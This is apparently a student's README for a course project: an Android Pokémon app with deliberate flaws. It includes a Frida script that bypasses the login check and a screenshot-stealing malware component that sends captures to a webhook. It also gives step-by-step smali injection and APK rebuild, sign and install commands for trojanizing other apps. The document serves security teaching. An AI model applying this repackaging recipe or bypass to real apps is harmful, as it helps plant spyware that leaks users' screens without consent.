# Mobile Security Project

## Overview

This project is a part of the Mobile Security evaluation assignment for my course. It involves creating an Android application with specific functionalities and intentional vulnerabilities to demonstrate potential security risks and pentesting techniques.

## Features

- **Pokémon Lookup**: Users can search for Pokémon and view their details.
- **Pokedex Management**: Users can add Pokémon to their Pokedex.
- **User Authentication**: Basic login functionality.

## Vulnerabilities

- **Frida Bypass**: The login can be bypassed using a Frida script, demonstrating the potential for security bypasses in mobile applications.
- **Malware Injection**: The app contains malware capable of taking screenshots of the user's screen and sending them to a specified webhook. This illustrates the risk of malware being injected into seemingly harmless applications.

## Technical Details

### Pokémon Lookup and Pokedex Management

1. **Views**:

   - **Pokedex Screen**: Displays a list of Pokémon.
   - **Seach For Pokemon Screen**: Lets the user search for pokemons using the PokeAPI
   - **Details Screen**: Shows detailed information about a selected Pokémon.

2. **Database Connection**:

   - The app connects to a local SQLite database to store Pokémon data.

3. **API Requests**:
   - The app makes requests to PokeAPI to fetch data.

### Vulnerabilities

1. **Frida Bypass**:

   - A Frida script can be used to bypass the login screen. This demonstrates how runtime manipulation can be used to bypass security checks in mobile applications.

2. **Malware Injection**:
   - The app contains malware that takes screenshots of the user's screen and sends them to a predefined webhook. This is implemented to show how malicious code can be embedded into an APK and the potential risks associated with it.

## Installation

1. Clone the repository

2. Open the project in Android Studio.

3. Add you own webhook

4. Build and run the project on an emulator or a physical device.

## Usage

1. **Login**:

   - Use the provided credentials to log in. (Note: This can be bypassed using a Frida script for demonstration purposes.)

2. **Search Pokémon**:

   - Use the search functionality to look up different Pokémon.

3. **Add to Pokedex**:
   - Add selected Pokémon to your Pokedex.

## Security Analysis

### Frida Bypass

To demonstrate the Frida bypass, use the following script:

```javascript
// Frida script to bypass login
Java.perform(function () {
  var emu = Java.use("com.howest.mobilesecurity.MyDatabaseHelper");
  emu.checkPasswordMatch.implementation = function (a, b) {
    return true;
  };
});
```

### Malware Injection

The malware is designed to take screenshots and send them to a webhook. Ensure to use this responsibly and only for educational purposes.

### Smali Code Injection

Combining the malware with the targeted application is very simple. The malware and targeted application need to be decompiled and put into the same folder then smali code is used to manipulate the functionallity of the targeted application. The AndroidManifest.xml of the malware is combined with the original one.

Inject the smali code that is responsible for the initialisation of the malware. Below is that code. Now, inject this smali code at the end of the `onCreate` method in the `MainActivity` file of the application you want to infect:

```smali
new-instance v0, Lcom/howest/screenshotmalware/One;

move-object v1, p0

check-cast v1, Landroid/app/Activity;

invoke-direct {v0, v1}, Lcom/howest/screenshotmalware/One;-><init>(Landroid/app/Activity;)V

invoke-virtual {v0}, Lcom/howest/screenshotmalware/One;->start()V
```

### Building and Signing the Infected APK

1. Rebuild the application:

   ```bash
   apktool b application/ -o unsigned.apk
   ```

2. Align the APK:

   ```bash
   zipalign -p -f -v 4 unsigned.apk InstallMalware.apk
   ```

3. Sign the APK:

   ```bash
   apksigner sign --ks key.keystore InstallMalware.apk
   ```

4. Generate a keystore (if you don't have one already):

   ```bash
   keytool -genkey -V -keystore key.keystore -alias Android -keyalg RSA -keysize 2048 -validity 10000
   ```

5. Install the infected APK on a device:

   ```bash
   adb install InstallMalware.apk
   ```

6. Delete the original application
   ```bash
   adb uninstall `path to application`
   ```

## Disclaimer

This project is for educational purposes only. The vulnerabilities and malware included are intended to demonstrate potential security risks and should not be used for malicious purposes. Always seek permission before testing security on any system or application.

---

By: Bastien
